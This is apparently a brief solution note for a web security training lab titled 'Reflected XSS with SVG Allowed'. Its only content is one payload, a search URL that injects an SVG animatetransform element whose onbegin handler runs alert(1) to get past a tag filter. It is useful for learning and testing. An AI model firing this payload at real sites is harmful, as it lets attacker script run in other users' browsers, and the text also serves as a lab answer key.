# Lab 16 — Reflected XSS with SVG Allowed (PRACTITIONER)

## Payload
```
/search?search=<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
